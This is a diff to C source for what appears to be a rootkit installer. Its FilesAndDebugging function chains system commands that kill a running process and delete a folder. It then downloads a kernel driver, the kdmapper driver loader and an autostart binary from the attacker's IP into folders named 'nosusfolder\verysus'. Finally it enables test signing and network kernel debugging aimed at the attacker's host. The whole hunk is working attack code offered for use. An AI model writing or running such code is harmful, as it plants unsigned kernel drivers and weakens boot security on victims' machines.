@@ -6,70 +6,43 @@ BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char
 		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
 		return FALSE;
 	}
-
-	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder") == -1) {
-		printf("[-] Failed execution of initial deleting command of nosusfolder 1 - %d\n", GetLastError());
+	if (system("taskkill /IM MainMedium.exe") == -1) {
+		printf("[-] Failed execution of initial termination command of MainMedium.exe - %d\n", GetLastError());
 		return FALSE;
 	}
 	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder") == -1) {
-		printf("[-] Failed execution of initial deleting command of nosusfolder 2 - %d\n", GetLastError());
+		printf("[-] Failed execution of initial deleting command of nosusfolder - %d\n", GetLastError());
 		return FALSE;
 	}
 
 	const char* ReplaceArr[3] = { AttackerIp, DebugPort, DebugKey };
 	const char* SymbolsArr = "~`\'";
-	const int TotalCommands = 43;
+	const int TotalCommands = 23;
 	const char* FileCommands[TotalCommands] = {
 		"cd C:\\ && ",
-		"mkdir nosusfolder && ",
-		"cd nosusfolder && ",
-		"mkdir verysus && ",
-		"cd verysus && ",
-		"mkdir MainMedium && ",
-		"cd MainMedium && ",
-		"curl http://~:8080/MainMedium/MainMedium.sln --output MainMedium.sln && ",
-		"curl http://~:8080/MainMedium/medium.cpp --output medium.cpp && ",
-		"curl http://~:8080/MainMedium/medium.h --output medium.h && ",
-		"curl http://~:8080/MainMedium/rootreqs.cpp --output rootreqs.cpp && ",
-		"curl http://~:8080/MainMedium/rootreqs.h --output rootreqs.h && ",
-		"curl http://~:8080/MainMedium/internet.cpp --output internet.cpp && ",
-		"curl http://~:8080/MainMedium/internet.h --output internet.h && ",
-		"curl http://~:8080/MainMedium/helpers.cpp --output helpers.cpp && ",
-		"curl http://~:8080/MainMedium/helpers.h --output helpers.h && "
-		"curl http://~:8080/MainMedium/MainMedium.vcxproj --output MainMedium.vcxproj && ",
-		"curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output MainMedium.vcxproj.filters && ",
-		"curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output MainMedium.vcxproj.user && ",
-		"mkdir x64\\Release && ",
-		"cd x64\\Release && ",
-		"curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output MainMedium.exe && ",
-		"cd .. && ",
-		"cd .. && ",
-		"cd .. && ",
-		"mkdir AutoService && ",
-		"cd AutoService && ",
-		"curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output AutoStart.exe && ",
-		"cd .. && ",
-		"mkdir KMDFdriver && ",
-		"cd KMDFdriver && ",
-		"mkdir Release && ",
-		"cd Release && ",
-		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output KMDFdriver.sys && ",
-		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output KMDFdriver.inf && ",
-		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output KMDFdriver.pdb && ",
-		"cd .. && ",
-		"cd .. && ",
-		"curl http://~:8080/drvmap-master/x64/Release/drvmap.exe --output drvmap.exe && ",
-		"curl http://~:8080/KPP/GuardMon/x64/Release/GuardMon.sys --output GuardMon.sys && ",
-		"curl http://~:8080/DrvLoader/DrvLoader/x64/Release/DrvLoader.exe --output DrvLoader.exe && ",
+		"mkdir nosusfolder\\verysus\\MainMedium\\x64\\Release && ",
+		"curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln && ",
+		"curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp && ",
+		"curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h && ",
+		"curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp && ",
+		"curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h && ",
+		"curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp && ",
+		"curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h && ",
+		"curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp && ",
+		"curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h && "
+		"curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj && ",
+		"curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters && ",
+		"curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user && ",
+		"curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe && ",
+	    "mkdir nosusfolder\\verysus\\KMDFdriver\\Release && ",
+		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys && ",
+		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf && ",
+		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb && ",
+		"curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe && ",	
+		"curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe && ",
 		"bcdedit /set TESTSIGNING ON && ",
 		"bcdedit /set DEBUG ON && ",
 		"bcdedit /dbgsettings NET HOSTIP:~ PORT:` KEY:\'" };
-	    /*
-		"curl http://~:8080/devcon.exe --output devcon.exe && ",
-		"copy /Y devcon.exe KMDFdriver\\devcon.exe && ",
-		"cd KMDFdriver && ",
-		"devcon.exe install kmdfdriver.inf root\\kmdfdriver" };
-		*/
 
 	return PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 3);
 }
